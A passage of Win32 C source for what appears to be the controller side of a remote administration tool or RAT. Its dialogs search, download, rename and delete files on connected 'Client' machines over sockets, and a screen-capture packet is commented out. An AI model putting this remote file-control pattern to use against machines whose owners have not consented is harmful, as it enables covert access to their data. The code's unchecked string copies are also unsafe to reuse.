		{
		strcpy(Copy, FinalDir);
		strcat(Copy, FileName);
		SetWindowText(GetDlgItem(hwnd, IDC_NAME), Copy);
		}
	break;

	case WM_COMMAND:
		Select=LOWORD(wParam);
		switch(Select)
		{
		case IDC_SETNAME:
		    GetWindowText(GetDlgItem(hwnd, IDC_NAME), Head.Data, 1020);
			GetWindowText(hwnd, WindowOut, 10);
			WindowOutY[0] = WindowOut[0];
			Head.ID = atoi(WindowOutY);
			Head.PacketType = PACKET_FILE_MANAGER_FILE_RENAME;
			strcpy(Head.Buf, Copy);
			SentKb+=send(Client[Head.ID],(char *) &Head, sizeof(Head), 0);
	if(V == 1)
	{
	        while(Head.Data[K] != NULL)
			{
			K++;
			}

			while(Head.Data[K] != '\\')
			{
			K--;
			}
			K++;
			while(Head.Data[K] != NULL)
			{
			NewName[W] += Head.Data[K]; 
			W++;
			K++;
			}
			item.iItem=ListView_GetNextItem(GetDlgItem(FileHwnd[Head.ID],IDC_FILELIST),-1,LVNI_SELECTED);
			item.mask=LVIF_TEXT;
			item.iSubItem=0;
			item.pszText=NewName;
			item.cchTextMax=255;
			ListView_SetItem(GetDlgItem(FileHwnd[Head.ID],IDC_FILELIST),&item);
	}
	else
	{
		    while(Head.Data[K] != NULL)
			{
			K++;
			}

			while(Head.Data[K] != '\\')
			{
			K--;
			}
			K++;
			while(Head.Data[K] != NULL)
			{
			NewName[W] = Head.Data[K]; 
			W++;
			K++;
			}

		    item.iItem=ListView_GetNextItem(GetDlgItem(FileHwnd[Head.ID],IDC_FOLDERS),-1,LVNI_SELECTED);
			item.mask=LVIF_TEXT;
			item.iSubItem=0;
			item.pszText=NewName;
			item.cchTextMax=255;
			ListView_SetItem(GetDlgItem(FileHwnd[Head.ID],IDC_FOLDERS),&item);
	}

			EndDialog(hwnd,Select);
			break;
		case IDCANCEL:
			        EndDialog(hwnd,Select);
					break;
		}
		return TRUE;
	}
	return 0;
}


DWORD WINAPI NameWindow(LPVOID lpParam)
{
    int LID = Head.ID;
	char WindowText [20] = "";
	POINT pt;
    GetCursorPos(&pt);
	pt.y -= 20;
	pt.x -= 20;
    ReName[LID]=CreateDialog(ReInst,(LPCTSTR)IDD_RENAME,NULL,(DLGPROC)RenameProc);
	ShowWindow(ReName[LID],SW_SHOW);
	SetWindowPos(ReName[LID], HWND_TOP, pt.x, pt.y, 0, 0, SWP_NOSIZE);
	InitCommonControls();

	ZeroMemory(&WindowText[0],10);
	sprintf(&WindowText[0],"%d", LID);
    strcat(WindowText, " Rename");
	SetWindowText(ReName[LID], WindowText);

	MSG msg;
	while(GetMessage(&msg,ReName[LID],0,0)==TRUE)
	{
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}
return 0;
}
/////////////////////////////////////////////////////////////////////////////////////////////
///Search window
LRESULT CALLBACK SearchProc(HWND hwnd,UINT message,WPARAM wParam,LPARAM lParam)
{
	int Select;
	char WindowOut  [10] = "";
	char WindowOutY [10] = "";
	int i = 0;
	int j = 0;
	char filename [100] = "";
	LV_COLUMN	col;
	LV_ITEM		item;
	
	HMENU hmenu;            // menu template          
    HMENU hmenuTrackPopup;  // shortcut menu   

	RECT rc;    // client area             
    POINT  pt;   // location of mouse click  
	switch(message)
	{
////////////////////////////////////////////////////////////////////////////////
	case WM_INITDIALOG:
		FinalDir[strlen(FinalDir) -1] = '\0';
		SetWindowText(GetDlgItem(hwnd, IDC_DIR), FinalDir);
		SetWindowText(GetDlgItem(hwnd, IDC_FILENAME), "*.jpeg");
 	    col.mask=LVCF_TEXT|LVCF_WIDTH|LVIF_IMAGE;
		col.cx=600;
		col.fmt = LVCFMT_IMAGE;
        ListView_SetExtendedListViewStyle(GetDlgItem(hwnd,IDC_SEARCHLIST),LVS_EX_FULLROWSELECT|LVS_EX_GRIDLINES);
		col.pszText="File name";
		ListView_InsertColumn(GetDlgItem(hwnd,IDC_SEARCHLIST),0,&col);
		CreateWindowEx(0, STATUSCLASSNAME, NULL,WS_CHILD | WS_VISIBLE | SBARS_SIZEGRIP, 0, 0, 0, 0,hwnd, (HMENU)IDC_SEARCH_STATUS , GetModuleHandle(NULL), NULL);
		SendMessage(GetDlgItem(hwnd,IDC_SEARCH_STATUS), SB_SETTEXT, 0, (LPARAM)"Idle.");
		InitCommonControls(); 
		/////////////////////////////////////////////////////////////
	break;

		case WM_NOTIFY:
		{
switch(wParam)
{
		case IDC_SEARCHLIST:
		{
            if(((LPNMHDR)lParam)->code == NM_RCLICK)  // Right Click
			{
				GetClientRect(hwnd, (LPRECT) &rc); 
 
            // Get the client coordinates for the mouse click.  
			  GetCursorPos(&pt);
			  pt.y += 10;
			  pt.x += 10;
            // If the mouse click took place inside the client 
            // area, execute the application-defined function 
            // that displays the shortcut menu. 
 
        
				 hmenu = LoadMenu(GInstance, MAKEINTRESOURCE(IDR_MENU5));

				 if (hmenu == NULL) 
				 {
                  break;
				 }
 
			// Get the first shortcut menu in the menu template. This is the 
			// menu that TrackPopupMenu displays. 
 
			hmenuTrackPopup = GetSubMenu(hmenu, 0); 
 
              // TrackPopup uses screen coordinates, so convert the 
             // coordinates of the mouse click to screen coordinates. 
 
             //ClientToScreen(hWnd, (LPPOINT) &pt); 
 
            // Draw and track the shortcut menu.  
 
            TrackPopupMenu(hmenuTrackPopup, TPM_LEFTALIGN | TPM_LEFTBUTTON, pt.x, pt.y, 0, hwnd, NULL); 
			break;
			}
			
		}
		break;
}
		}
		break;
	case WM_COMMAND:
		Select=LOWORD(wParam);
		switch(Select)
		{
		case IDC_SEARCH:
		    SendMessage(GetDlgItem(hwnd,IDC_SEARCH_STATUS), SB_SETTEXT, 0, (LPARAM)"Searching...");
			GetWindowText(hwnd, WindowOut, 10);
			WindowOutY[0] = WindowOut[0];
			Head.ID = atoi(WindowOutY);
			
			GetWindowText(GetDlgItem(hwnd, IDC_FILENAME), Head.Buf, 100);
			GetWindowText(GetDlgItem(hwnd, IDC_DIR), Head.Buf2, 50);
			Head.PacketType = PACKET_FILE_MANAGER_SEARCH;
			SentKb+=send(Client[Head.ID], (char *)&Head, sizeof(PACKETHEAD), 0);
			break;

		case IDC_DOWNLOAD:
				GetWindowText(hwnd, WindowOut, 10);
			    WindowOutY[0] = WindowOut[0];
			    Head.ID = atoi(WindowOutY);
			ZeroMemory(&Head, HeadSize);
            item.iItem=ListView_GetNextItem(GetDlgItem(hwnd,IDC_SEARCHLIST),-1,LVNI_SELECTED);
			item.mask=LVIF_TEXT;
			item.iSubItem=0;
			item.pszText=FinalDir;
			item.cchTextMax=255;
			ListView_GetItem(GetDlgItem(hwnd,IDC_SEARCHLIST),&item);		
			i = 0;
		
            ZeroMemory(filename, sizeof(filename));
              
               for(i=0; i < strlen(FinalDir)-1; i++)
                  if(FinalDir[i] == '\\')
				  {
                     FinalDir[i] = '/';
				  }
                     
               i = strlen(FinalDir)-1;
               
               while(FinalDir[i] != '/') 
			   {
                  i--;
			   }
               i++; 
               
               for(;i<(strlen(FinalDir));i++)
			   {
                  filename[j] = FinalDir[i];
                  j++;
               }   
			   strcpy(Head.Buf2, FinalDir);
               for(i=0; i<strlen(Head.Buf2); i++)
			   {
                  if(Head.Buf2[i] == '\\')
				  {
                     Head.Buf2[i] = '/';
				  }
			   }
			    if(D == 1024)
				{
				D = 0;
				}
				strcpy(Head.Data, Head.Buf2);
				 Head.PacketType = PACKET_FILE_MANAGER_FILE_DOWN;
		         Head.ID2 = D;
		         Head.ID3 = ListView_GetItemCount(GetDlgItem(FileHwnd[Head.ID],IDC_DOWNLOADS));
			

		 
		   //MessageBox(NULL, filename, "filename", MB_OK);

	item.mask=TVIF_TEXT;
	item.iItem=Head.ID2;

	item.iSubItem=0;
	item.pszText=filename;
	item.iItem=ListView_InsertItem(GetDlgItem(FileHwnd[Head.ID],IDC_DOWNLOADS),&item);


	item.iSubItem=1;
	item.pszText="Download";
	ListView_SetItem(GetDlgItem(FileHwnd[Head.ID],IDC_DOWNLOADS),&item);

	item.iSubItem=2;
	item.pszText="Qued";
	ListView_SetItem(GetDlgItem(FileHwnd[Head.ID],IDC_DOWNLOADS),&item);
		   
	while(send(Client[Head.ID],(char *)&Head, HeadSize, 0) == SOCKET_ERROR)
	{
	Sleep(1000);
	}
				D++;
			break;
		case IDC_DELETEFILE:
			{	
				if(MessageBox(NULL, "Are you sure you want Delete this file?", "Delete", MB_YESNO | MB_ICONWARNING) == IDYES)
				{
			GetWindowText(hwnd, WindowOut, 10);
			WindowOutY[0] = WindowOut[0];
			Head.ID = atoi(WindowOutY);
				
			    item.iItem=ListView_GetNextItem(GetDlgItem(hwnd,IDC_SEARCHLIST),-1,LVNI_SELECTED);
				item.mask=LVIF_TEXT;
				item.iSubItem=0;
				item.pszText=FinalDir;
				item.cchTextMax=255;
				ListView_GetItem(GetDlgItem(hwnd,IDC_SEARCHLIST),&item);
				strcpy(Head.Data, FinalDir);
				ListView_DeleteItem(GetDlgItem(hwnd,IDC_SEARCHLIST),ListView_GetNextItem(GetDlgItem(hwnd,IDC_SEARCHLIST),-1,LVNI_SELECTED));
				
				Head.PacketType = PACKET_FILE_MANAGER_DELETE_FILE;
				while(send(Client[Head.ID],(char *)&Head, HeadSize, 0) == SOCKET_ERROR)
				{
				Sleep(1000);
				}
				

			/*	ResetProcs(hWnd, IDC_FOLDERS);
				ResetProcs(hWnd, IDC_FILELIST);
				strcpy(Head.Data, FinalDir);
				Head.PacketType = PACKET_FILE_MANAGER_FILE_FOLDER;
				send(Client[Head.ID],(char*)&Head, HeadSize, 0);*/
				}
				else
				{
				break;
				}
				break;
			    
			}
		case IDCANCEL:
					GetWindowText(GetDlgItem(hwnd, IDC_ID), WindowOut, 10);
			        Head.ID = atoi(WindowOut);
					SearchHwnd[Head.ID] = NULL;
					EndDialog(hwnd,Select);
					break;
		}

//////////////////////////////////////////////////////////////////////////////// 
	default:
		return FALSE;
	}
return TRUE;
}

DWORD WINAPI SearchWindow(LPVOID lpParam)
{
	int PROCID = (int)lpParam;
	char WindowText [20] = "";
   
	SearchHwnd[PROCID]=CreateDialog(SearchInst,(LPCTSTR)IDD_SEARCH,NULL,(DLGPROC)SearchProc);
	ShowWindow(SearchHwnd[PROCID],SW_SHOW);
	InitCommonControls();

	ZeroMemory(&WindowText[0],10);
	sprintf(&WindowText[0],"%d", PROCID);
	strcat(WindowText, " Search File.");
	SetWindowText(SearchHwnd[PROCID], WindowText);
/*	Head.PacketType = SCREEN_CAPTURE;
	send(Client[PROCID],(char*)&Head,HeadSize,0);*/
	MSG msg;
	while(GetMessage(&msg,SearchHwnd[PROCID],0,0)==TRUE)
	{
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}

return 0;
}
int GetParentFileDir(HWND hwnd, HTREEITEM hitem, char * Buf, int ID)
{
char A [1024] = "";
char B [1024] = "";
char C [1024] = "";
int BA = 0;
HTREEITEM hitemA;
HTREEITEM hitemB;
//////////////////////////////////////////
					strcpy(B, C);
					strcpy(C, Buf);
					strcat(C, B);
				   // MessageBox(NULL, C, "C", MB_OK);
					if(C[1] == ':')
						{
						strcpy(Head.Data, C);
						Head.PacketType = PACKET_FILE_MANAGER_FILE_FOLDER;
						SentKb+=send(Client[ID],(char *)&Head,sizeof(PACKETHEAD),0);
						SendMessage(GetDlgItem(hwnd,IDC_TASK_STATUS), SB_SETTEXT, 0, (LPARAM)C);
						return 0;
						}
				
					
//////////////////////////////////////////
hitemA = TreeView_GetParent(GetDlgItem(hwnd, IDC_TREE1), hitem);
     
			    TreeView_EnsureVisible(hwnd,hitemA);
			    SendDlgItemMessage(hwnd,IDC_TREE1,TVM_SELECTITEM,TVGN_CARET,(LPARAM)hitemA);
				flagSelected=true;
	            tvi.mask=TVIF_TEXT;
				tvi.pszText=A;
				tvi.cchTextMax=256;
				tvi.hItem=hitemA;

					if(SendDlgItemMessage(hwnd,IDC_TREE1,TVM_GETITEM,TVGN_CARET,(LPARAM)&tvi))
					{
				//	MessageBox(NULL, A, "A", MB_OK);
						if(A[1] == ':')
						{
						strcpy(B, C);
						strcpy(C, A);
						strcat(C, B);
						strcat(C, "\\");
					//	MessageBox(NULL, Head.Data, "A FINISH", MB_OK);
						SendMessage(GetDlgItem(hwnd,IDC_TASK_STATUS), SB_SETTEXT, 0, (LPARAM)C);
						strcpy(Head.Data, C);
						Head.PacketType = PACKET_FILE_MANAGER_FILE_FOLDER;
						SentKb+=send(Client[ID],(char *)&Head,sizeof(PACKETHEAD),0);
			//			MessageBox(NULL, Head.Data, "A FINISH 0.5", MB_OK);
						return 0;
						 
						}

				
					strcpy(B, C);
					strcpy(C, A);
					strcat(C, "\\");
					strcat(C, B);
					}
while(1)
{
switch(BA)
	{
	case 0:
		hitemB = TreeView_GetParent(GetDlgItem(hwnd, IDC_TREE1), hitemA);
     
			    TreeView_EnsureVisible(hwnd,hitemB);
			    SendDlgItemMessage(hwnd,IDC_TREE1,TVM_SELECTITEM,TVGN_CARET,(LPARAM)hitemB);
				flagSelected=true;
	            tvi.mask=TVIF_TEXT;
				tvi.pszText=A;
				tvi.cchTextMax=256;
				tvi.hItem=hitemB;
				if(SendDlgItemMessage(hwnd,IDC_TREE1,TVM_GETITEM,TVGN_CARET,(LPARAM)&tvi))
					{
				 //	MessageBox(NULL, A, "A", MB_OK);
						if(A[1] == ':')
						{
						strcpy(B, C);
						strcpy(C, A);
						strcat(C, B);
						strcat(C, "\\");
						SendMessage(GetDlgItem(hwnd,IDC_TASK_STATUS), SB_SETTEXT, 0, (LPARAM)C);
				//		MessageBox(NULL, Head.Data, "A FINISH 1", MB_OK);
						strcpy(Head.Data, C);
						Head.PacketType = PACKET_FILE_MANAGER_FILE_FOLDER;
						SentKb+=send(Client[ID],(char *)&Head,sizeof(PACKETHEAD),0);
				//		MessageBox(NULL, Head.Data, "A 1.5", MB_OK);
						return 0;
						 //MessageBox(NULL, A, "A", MB_OK);
						}

					strcpy(B, C);
					strcpy(C, A);
					strcat(C, "\\");
					strcat(C, B);
					}
					
					BA = 1;
		break;

	case 1:
				hitemA = TreeView_GetParent(GetDlgItem(hwnd, IDC_TREE1), hitemB);
     
			    TreeView_EnsureVisible(hwnd,hitemA);
			    SendDlgItemMessage(hwnd,IDC_TREE1,TVM_SELECTITEM,TVGN_CARET,(LPARAM)hitemA);
				flagSelected=true;
	            tvi.mask=TVIF_TEXT;
				tvi.pszText=A;
				tvi.cchTextMax=256;
				tvi.hItem=hitemA;

					if(SendDlgItemMessage(hwnd,IDC_TREE1,TVM_GETITEM,TVGN_CARET,(LPARAM)&tvi))
					{
				//		MessageBox(NULL, A, "A", MB_OK);
						if(A[1] == ':')
						{
						strcpy(B, C);
						strcpy(C, A);
						strcat(C, B);
						strcat(C, "\\");

						SendMessage(GetDlgItem(hwnd,IDC_TASK_STATUS), SB_SETTEXT, 0, (LPARAM)C);
			//			MessageBox(NULL, A, "A", MB_OK);
						strcpy(Head.Data, C);
				//		MessageBox(NULL, Head.Data, "A FINISH 2", MB_OK);
						Head.PacketType = PACKET_FILE_MANAGER_FILE_FOLDER;
						SentKb+=send(Client[ID],(char *)&Head,sizeof(PACKETHEAD),0);
				//		MessageBox(NULL, Head.Data, "A 2.5", MB_OK);
						return 0;
						 //MessageBox(NULL, A, "A", MB_OK);
						}				
					strcpy(B, C);
					strcpy(C, A);
					strcat(C, "\\");
					strcat(C, B);
										
					}
					
					BA = 0;
		break;
	}
	
}

return 0;
}
int DeleteChild(HWND hwnd, int Control, HTREEITEM hitem)
{
HTREEITEM Second;

while(Second = TreeView_GetChild(GetDlgItem(hwnd, Control),hitem))
{
TreeView_DeleteItem(GetDlgItem(hwnd, Control),Second);
}

return 0;
}
int SetFileWindow(HWND hWnd)
{
	RECT rc;    // client area  
			 GetClientRect(hWnd, &rc);
			 MoveWindow(GetDlgItem(hWnd, IDC_FILELIST),(rc.right / 3) + 5,25,(rc.right - (rc.right / 3)) - 10, rc.bottom - 60, TRUE);
			 MoveWindow(GetDlgItem(hWnd, IDC_DOWNLOADS),0,25,rc.right - 5, rc.bottom - 60, TRUE);
			 MoveWindow(GetDlgItem(hWnd, IDC_SEARCHLIST),0,70,rc.right - 5, rc.bottom - 100, TRUE);
			 MoveWindow(GetDlgItem(hWnd, IDC_STATICA),5,40,25, 20, TRUE);
			 MoveWindow(GetDlgItem(hWnd, IDC_DIR),30,35,rc.right / 3, 20, TRUE);
			 MoveWindow(GetDlgItem(hWnd, IDC_STATICB),(rc.right / 3) + 45,40,50, 20, TRUE);
			 MoveWindow(GetDlgItem(hWnd, IDC_FILENAME),(rc.right / 3) + 100,35,(rc.right / 3), 20, TRUE);	
			 MoveWindow(GetDlgItem(hWnd, IDC_SEARCH),rc.right - 70,35,60, 20, TRUE);
			 
			 MoveWindow(GetDlgItem(hWnd, IDC_TREE1),0,25,rc.right / 3, rc.bottom - 60, TRUE);
	    	 MoveWindow(GetDlgItem(hWnd, IDC_TAB4),0,0,rc.right, rc.bottom - 20, TRUE);
			 MoveWindow(GetDlgItem(hWnd, IDC_TASK_STATUS),0,rc.bottom - 20,rc.right, 20, TRUE);
return 0;
}
LRESULT CALLBACK FileProc(HWND hWnd,UINT message,WPARAM wParam,LPARAM lParam)
{
    char Text[256];
	char WindowOutY [10] = "";
	char WindowOut  [10] = "";
    char filename[80];
//	char FileN [256];
	HWND Status = 0;
    char Buffer [512] = "";
//     MSG msg;

//    NMITEMACTIVATE LPNMITEM;
	LV_COLUMN	col;
	LV_ITEM		item;
	
	HMENU hmenu;            // menu template          
    HMENU hmenuTrackPopup;  // shortcut menu   

	RECT rc;    // client area             
    POINT  pt;   // location of mouse click  

//	HICON hIcon;

//	TCITEM tie; 

    int i = 0;
	int j = 0;
	int K = 1;
    int Select = 0;
		TCITEM tie;
	switch(message)
	{
////////////////////////////////////////////////////////////////////////////////
	case WM_INITDIALOG:
		InitCommonControls();	    // make our tree control to work
		////////////////////////////////////////////////////////////////////////////////////////////////////////
		 //Drive view
		
			ImageList_SetBkColor(hImageList,CLR_NONE);
			//hIcon=(HICON)LoadImage(GetModuleHandle(NULL), MAKEINTRESOURCE(IDI_FOLDER), IMAGE_ICON, 16, 16, 0);				  // load the picture from the resource
			//ImageList_AddIcon(hImageList, hIcon);
     

	tie.mask = TCIF_TEXT | TCIF_IMAGE;  
    tie.pszText = "File's";
	
	TabCtrl_InsertItem(GetDlgItem(hWnd, IDC_TAB4), 0, &tie);

	tie.mask = TCIF_TEXT | TCIF_IMAGE;  
    tie.pszText = "Transfer's";
	
	TabCtrl_InsertItem(GetDlgItem(hWnd, IDC_TAB4), 1, &tie);

	tie.mask = TCIF_TEXT | TCIF_IMAGE;  
    tie.pszText = "Search";
	
	TabCtrl_InsertItem(GetDlgItem(hWnd, IDC_TAB4), 2, &tie);
		
	ShowWindow(GetDlgItem(hWnd, IDC_DOWNLOADS),SW_HIDE);
	ShowWindow(GetDlgItem(hWnd, IDC_SEARCHLIST),SW_HIDE);
	ShowWindow(GetDlgItem(hWnd, IDC_DIR),SW_HIDE);
	ShowWindow(GetDlgItem(hWnd, IDC_FILENAME),SW_HIDE);
	ShowWindow(GetDlgItem(hWnd, IDC_SEARCH),SW_HIDE);
	ShowWindow(GetDlgItem(hWnd, IDC_STATICA),SW_HIDE);
	ShowWindow(GetDlgItem(hWnd, IDC_STATICB),SW_HIDE);
	
 	    col.mask=LVCF_TEXT|LVCF_WIDTH|LVIF_IMAGE;
		col.cx=600;
		col.fmt = LVCFMT_IMAGE;
        ListView_SetExtendedListViewStyle(GetDlgItem(hWnd,IDC_SEARCHLIST),LVS_EX_FULLROWSELECT|LVS_EX_GRIDLINES);
		col.pszText="File name";
		ListView_InsertColumn(GetDlgItem(hWnd,IDC_SEARCHLIST),0,&col);
	
		SetFileWindow(hWnd);

 	    col.mask=LVCF_TEXT|LVCF_WIDTH|LVIF_IMAGE;
		col.cx=200;
		col.fmt = LVCFMT_IMAGE;
        ListView_SetExtendedListViewStyle(GetDlgItem(hWnd,IDC_FILELIST),LVS_EX_FULLROWSELECT|LVS_EX_GRIDLINES);
		col.pszText="File name";
		ListView_InsertColumn(GetDlgItem(hWnd,IDC_FILELIST),0,&col);
		col.cx=152;
		col.fmt = LVCFMT_IMAGE;
		col.pszText="File Size";
		ListView_InsertColumn(GetDlgItem(hWnd,IDC_FILELIST),1,&col);
		col.cx=152;
///////////////////////////////////////////////////////////////////////////////////
		ListView_SetExtendedListViewStyle(GetDlgItem(hWnd,IDC_DOWNLOADS),LVS_EX_FULLROWSELECT |LVS_EX_GRIDLINES);
		col.mask=LVCF_TEXT|LVCF_WIDTH;
		col.cx=300;
		col.pszText="File";
		ListView_InsertColumn(GetDlgItem(hWnd,IDC_DOWNLOADS), 0,&col);
		
		col.mask=LVCF_TEXT|LVCF_WIDTH;
		col.cx=200;
		col.pszText="Upload/Download";
		ListView_InsertColumn(GetDlgItem(hWnd,IDC_DOWNLOADS), 1,&col);

		col.mask=LVCF_TEXT|LVCF_WIDTH;
		col.cx=200;
		col.pszText="Status";
		ListView_InsertColumn(GetDlgItem(hWnd,IDC_DOWNLOADS), 2,&col);

		col.mask=LVCF_TEXT|LVCF_WIDTH;
		col.cx=0;
		col.pszText="ID";
		ListView_InsertColumn(GetDlgItem(hWnd,IDC_DOWNLOADS), 3,&col);
////////////////////////////////////////////////////////////////////////////////////////////////////////
		//Satus Bar
		 CreateWindowEx(0, STATUSCLASSNAME, NULL,WS_CHILD | WS_VISIBLE | SBARS_SIZEGRIP, 0, 0, 0, 0,hWnd, (HMENU)IDC_TASK_STATUS , GetModuleHandle(NULL), NULL);
		 SendMessage(GetDlgItem(hWnd,IDC_TASK_STATUS), SB_SETTEXT, 0, (LPARAM)"");			

			tvinsert.item.iSelectedImage = 5;
		    SendDlgItemMessage(hWnd,IDC_TREE1,TVM_SETIMAGELIST,0,(LPARAM)hImageList); // put it onto the tree control
            ListView_SetImageList(GetDlgItem(hWnd, IDC_FOLDERS),hImageList, LVSIL_SMALL);
			ListView_SetImageList(GetDlgItem(hWnd, IDC_FILELIST),hImageList, LVSIL_SMALL);
			ListView_SetImageList(GetDlgItem(hWnd, IDC_DOWNLOADS),cImageList, LVSIL_SMALL);


			tvinsert.hParent=NULL;			// top most level no need handle
			tvinsert.hInsertAfter=TVI_ROOT; // work as root level
            tvinsert.item.mask=TVIF_TEXT|TVIF_IMAGE;
			tvinsert.item.pszText="BookMarks";
			tvinsert.item.iImage=6;
			Parent=(HTREEITEM)SendDlgItemMessage(hWnd,IDC_BOOKMARKS,TVM_INSERTITEM,0,(LPARAM)&tvinsert);
			Root=Parent;
			break;
	
		case WM_LBUTTONDOWN: 
		{
			ReleaseCapture(); 
			SendMessage(hWnd,WM_NCLBUTTONDOWN,HTCAPTION,0); 
		}
		break;
	case WM_SIZING:
			switch(wParam)
			{
			case WMSZ_BOTTOM:
			SetFileWindow(hWnd);
			break;
			case WMSZ_BOTTOMLEFT:
			SetFileWindow(hWnd);
			break;
			case WMSZ_BOTTOMRIGHT:
			SetFileWindow(hWnd);
			break;
			case WMSZ_LEFT:
			SetFileWindow(hWnd);
            break;
			case WMSZ_RIGHT:
			SetFileWindow(hWnd);
			break;
			case WMSZ_TOP:
			SetFileWindow(hWnd);
			break;
			case WMSZ_TOPLEFT:
			SetFileWindow(hWnd);
			break;
			case WMSZ_TOPRIGHT:
			SetFileWindow(hWnd);
			break;
			}
			break;
		case WM_NOTIFY:
            switch (((LPNMHDR)lParam)->code)
            {
            case TCN_SELCHANGE:
                { 
                    int iPage = TabCtrl_GetCurSel(GetDlgItem(hWnd, IDC_TAB4)); 
                   
				switch(iPage)
				{
				case 0:
			 GetClientRect(hWnd, &rc);

 			 ShowWindow(GetDlgItem(hWnd, IDC_DOWNLOADS ),SW_HIDE);
		     ShowWindow(GetDlgItem(hWnd, IDC_FILELIST ),SW_SHOW);
			 ShowWindow(GetDlgItem(hWnd, IDC_TREE1 ),SW_SHOW);

			ShowWindow(GetDlgItem(hWnd, IDC_SEARCHLIST),SW_HIDE);
			ShowWindow(GetDlgItem(hWnd, IDC_DIR),SW_HIDE);
			ShowWindow(GetDlgItem(hWnd, IDC_FILENAME),SW_HIDE);
			ShowWindow(GetDlgItem(hWnd, IDC_SEARCH),SW_HIDE);
			ShowWindow(GetDlgItem(hWnd, IDC_STATICA),SW_HIDE);
			ShowWindow(GetDlgItem(hWnd, IDC_STATICB),SW_HIDE);

		SetFileWindow(hWnd);
	
				break;

				case 1:
			GetClientRect(hWnd, &rc);

				ShowWindow(GetDlgItem(hWnd, IDC_DOWNLOADS ),SW_SHOW);
				ShowWindow(GetDlgItem(hWnd, IDC_FILELIST ),SW_HIDE);
				ShowWindow(GetDlgItem(hWnd, IDC_TREE1 ),SW_HIDE);
		
				ShowWindow(GetDlgItem(hWnd, IDC_SEARCHLIST),SW_HIDE);
				ShowWindow(GetDlgItem(hWnd, IDC_DIR),SW_HIDE);
				ShowWindow(GetDlgItem(hWnd, IDC_FILENAME),SW_HIDE);
				ShowWindow(GetDlgItem(hWnd, IDC_SEARCH),SW_HIDE);
				ShowWindow(GetDlgItem(hWnd, IDC_STATICA),SW_HIDE);
				ShowWindow(GetDlgItem(hWnd, IDC_STATICB),SW_HIDE);

				SetFileWindow(hWnd);
				break;
				
				case 2:

				ShowWindow(GetDlgItem(hWnd, IDC_DOWNLOADS ),SW_HIDE);
				ShowWindow(GetDlgItem(hWnd, IDC_FILELIST ),SW_HIDE);
				ShowWindow(GetDlgItem(hWnd, IDC_TREE1 ),SW_HIDE);
				
				ShowWindow(GetDlgItem(hWnd, IDC_SEARCHLIST),SW_SHOW);
				ShowWindow(GetDlgItem(hWnd, IDC_DIR),SW_SHOW);
				ShowWindow(GetDlgItem(hWnd, IDC_FILENAME),SW_SHOW);
				ShowWindow(GetDlgItem(hWnd, IDC_SEARCH),SW_SHOW);
				ShowWindow(GetDlgItem(hWnd, IDC_STATICA),SW_SHOW);
				ShowWindow(GetDlgItem(hWnd, IDC_STATICB),SW_SHOW);
				SetFileWindow(hWnd);
				GetWindowText(GetDlgItem(hWnd,IDC_TASK_STATUS), FinalDir, 512);
				FinalDir[strlen(FinalDir) -1] = '\0';
				SetWindowText(GetDlgItem(hWnd, IDC_DIR), FinalDir);
				SetWindowText(GetDlgItem(hWnd, IDC_FILENAME), "*.jpeg");
				

				break;
				}
                    
                }
				break;
            }
switch(wParam)
{

		
		case IDC_FILELIST:
		{
            GetWindowText(GetDlgItem(hWnd,IDC_TASK_STATUS), FinalDir, 512);

			if(((LPNMHDR)lParam)->code == NM_DBLCLK) // if code == NM_CLICK - Single click on an item
			{ 
				break;
			}

			if(((LPNMHDR)lParam)->code == NM_RCLICK)  // Right Click
			{
				GetClientRect(hWnd, (LPRECT) &rc); 
 
            // Get the client coordinates for the mouse click.  
			  GetCursorPos(&pt);
			  pt.y += 10;
			  pt.x += 10;
            // If the mouse click took place inside the client 
            // area, execute the application-defined function 
            // that displays the shortcut menu. 
 
        
				 hmenu = LoadMenu(GInstance, MAKEINTRESOURCE(IDR_MENU3));

				 if (hmenu == NULL) 
				 {
                  break;
				 }
 
			// Get the first shortcut menu in the menu template. This is the 
			// menu that TrackPopupMenu displays. 
 
			hmenuTrackPopup = GetSubMenu(hmenu, 0); 
 
              // TrackPopup uses screen coordinates, so convert the 
             // coordinates of the mouse click to screen coordinates. 
 
             //ClientToScreen(hWnd, (LPPOINT) &pt); 
 
            // Draw and track the shortcut menu.  
 
            TrackPopupMenu(hmenuTrackPopup, TPM_LEFTALIGN | TPM_LEFTBUTTON, pt.x, pt.y, 0, hWnd, NULL); 
			break;
			}
			
		}
		break;
		  case IDC_TREE1:
            
			if(((LPNMHDR)lParam)->code == NM_DBLCLK) // if code == NM_CLICK - Single click on an item
			{
				char Text[255]="";
				memset(&tvi,0,sizeof(tvi));
					GetWindowText(GetDlgItem(hWnd, IDC_ID), WindowOut, 10);
			        Head.ID = atoi(WindowOut);
					//MessageBox(NULL, Text, Text, MB_OK);
				Selected[Head.ID] = NULL;
				Selected[Head.ID]=(HTREEITEM)SendDlgItemMessage(hWnd,IDC_TREE1,TVM_GETNEXTITEM,TVGN_CARET,(LPARAM)Selected[Head.ID]);
				
				if(Selected[Head.ID]==NULL)
				{
					MessageBox(NULL,"No Items in TreeView","Error",MB_OK|MB_ICONINFORMATION);
					break;
				}

				ResetProcs(hWnd, IDC_FILELIST);
				TreeView_EnsureVisible(hWnd,Selected[Head.ID]);
			    SendDlgItemMessage(hWnd,IDC_TREE1,TVM_SELECTITEM,TVGN_CARET,(LPARAM)Selected[Head.ID]);
				flagSelected=true;
	            tvi.mask=TVIF_TEXT;
				tvi.pszText=Text;
				tvi.cchTextMax=256;
				tvi.hItem=Selected[Head.ID];

					if(SendDlgItemMessage(hWnd,IDC_TREE1,TVM_GETITEM,TVGN_CARET,(LPARAM)&tvi))
					{
					//	MessageBox(NULL, Text, Text, MB_OK);
						GetWindowText(GetDlgItem(hWnd,IDC_TASK_STATUS), FinalDir, 512);

					GetWindowText(GetDlgItem(hWnd, IDC_ID), WindowOut, 10);
			        Head.ID = atoi(WindowOut);
					DeleteChild(hWnd, IDC_TREE1, Selected[Head.ID]);
					GetParentFileDir(hWnd, Selected[Head.ID], Text, Head.ID);
				    ResetProcs(hWnd, IDC_FILELIST);
					
					  break;
					}
				
			}
			break;
		case IDC_DOWNLOADS:
			{
				GetWindowText(GetDlgItem(hWnd,IDC_TASK_STATUS), FinalDir, 512);
				if(((LPNMHDR)lParam)->code == NM_RCLICK)  // Right Click
				{
					GetClientRect(hWnd, (LPRECT) &rc); 
 
				
					GetCursorPos(&pt);
					pt.y += 10;
					pt.x += 10;
            // If the mouse click took place inside the client 
            // area, execute the application-defined function 
            // that displays the shortcut menu. 
 
        
